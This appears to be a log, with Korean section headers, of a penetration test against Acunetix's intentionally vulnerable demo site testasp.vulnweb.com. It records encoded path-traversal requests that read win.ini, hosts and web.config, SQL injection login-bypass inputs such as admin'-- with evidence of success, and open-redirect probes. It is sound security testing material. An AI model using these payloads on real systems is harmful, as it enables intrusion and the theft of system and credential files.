@@ -1,0 +1,107 @@
+============================================================================================
+### (a) traversal — windows/win.ini 실제 내용 (증거)
+  status: HTTP/1.1 200 OK  body_len=2827  sha=78e58b86771f
+  --- 본문(앞 40줄) ---
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Untitled Document</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+<table width="100%"  border="0" cellpadding="10" cellspacing="0"> 
+  <tr bgcolor="#008F00"> 
+    <td width="306px"><a href="https://www.acunetix.com/"><img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></td> 
+    <td align="right" valign="middle" bgcolor="#008F00" class="disclaimer">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><div class="menubar"><a href="Templatize.asp?item=html/about.html" class="menu">about</a> - <a href="Default.asp" class="menu">forums</a> - <a href="Search.asp" class="menu">search</a> 
+     - <a href="./Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3D%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252Fwindows%252Fwin%2Eini" class="menu">login</a> - <a href="./Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3D%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252F%2E%2E%252Fwindows%252Fwin%2Eini" class="menu">register</a> 
+	- <a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu">SQL scanner</a> - <a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu">SQL vuln help</a>
+    </div></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><!-- InstanceBeginEditable name="MainContentLeft" -->
+		; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+
+		<!-- InstanceEndEditable --></td> 
+  </tr> 
+  <tr align="right" bgcolor="#FFFFFF"> 
+    <td colspan="2" class="footer">Copyright 2019 Acunetix Ltd.</td> 
+  </tr> 
+</table> 
+<div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px">
+
+### (a2) 같은 기법으로 읽히는 다른 시스템 파일
+  windows/win.ini                               -> HTTP/1.1 200 OK len=  2827  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//E
+  windows/system32/drivers/etc/hosts            -> HTTP/1.1 200 OK len=  3657  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//E
+  boot.ini                                      -> HTTP/1.1 500 Internal Server len=  1179  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "ht
+  windows/system.ini                            -> HTTP/1.1 200 OK len=  2954  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//E
+  inetpub/wwwroot/testasp/Default.asp           -> HTTP/1.1 500 Internal Server len=  1179  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "ht
+  inetpub/wwwroot/testasp/web.config            -> HTTP/1.1 500 Internal Server len=  1179  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "ht
+
+### (b) html/../web.config 내용 확인
+  status: HTTP/1.1 200 OK len=3115
+  --- 앞 30줄 ---
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->
+<head>
+<!-- InstanceBeginEditable name="doctitle" -->
+<title>Untitled Document</title>
+<!-- InstanceEndEditable -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+<table width="100%"  border="0" cellpadding="10" cellspacing="0"> 
+  <tr bgcolor="#008F00"> 
+    <td width="306px"><a href="https://www.acunetix.com/"><img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></td> 
+    <td align="right" valign="middle" bgcolor="#008F00" class="disclaimer">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><div class="menubar"><a href="Templatize.asp?item=html/about.html" class="menu">about</a> - <a href="Default.asp" class="menu">forums</a> - <a href="Search.asp" class="menu">search</a> 
+     - <a href="./Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2F%2E%2E%2Fweb%2Econfig" class="menu">login</a> - <a href="./Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2F%2E%2E%2Fweb%2Econfig" class="menu">register</a> 
+	- <a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu">SQL scanner</a> - <a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu">SQL vuln help</a>
+    </div></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><!-- InstanceBeginEditable name="MainContentLeft" -->
+		<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+    <system.web>
+        <authentication mode="Forms" />
+    </system.web>
+
+### (c) 로그인 우회 — 매 시도마다 새 세션, 302 Location 확인
+  tfUName=admin'--&tfUPass=x             -> HTTP/1.1 302 Object moved  Location=['Location: Default.asp']
+  tfUName=x' OR 'x'='x&tfUPass=x         -> HTTP/1.1 200 OK  Location=[]
+  tfUName=admin&tfUPass=' OR '1'='1      -> HTTP/1.1 302 Object moved  Location=['Location: Default.asp']
+  tfUName=' OR '1'='1'--&tfUPass=x       -> HTTP/1.1 302 Object moved  Location=['Location: Default.asp']
+
+### (d) 우회 세션으로 인증 상태 확인 (새 세션 → 로그인 → Default.asp)
+  로그인: HTTP/1.1 302 Object moved Location=['Location: Default.asp']
+  GET /Default.asp: HTTP/1.1 200 OK len=3426
+    메뉴: - <a href="./Logout.asp?RetURL=%2FDefault%2Easp%3F" class="menu">logout admin'--</a>
+  'logout' 등장: True
+  GET /showthread.asp?id=0: HTTP/1.1 200 OK len=4027  <form>=True textarea=True
+      mode : "textareas",
+      <form name="frmPostMessage" method="post" enctype="application/x-www-form-urlencoded">
+      <textarea name="tfText" class="postit" id="tfText"></textarea>
+
+### (e) RetURL open redirect (우회 로그인 + RetURL) — 새 세션
+  RetURL=http://example.com/                      -> HTTP/1.1 302 Object moved Location=['Location: http://example.com/']
+  RetURL=//example.com/                           -> HTTP/1.1 302 Object moved Location=['Location: //example.com/']
+  RetURL=http://testasp.vulnweb.com/Default.asp   -> HTTP/1.1 302 Object moved Location=['Location: http://testasp.vulnweb.com/Default.asp']
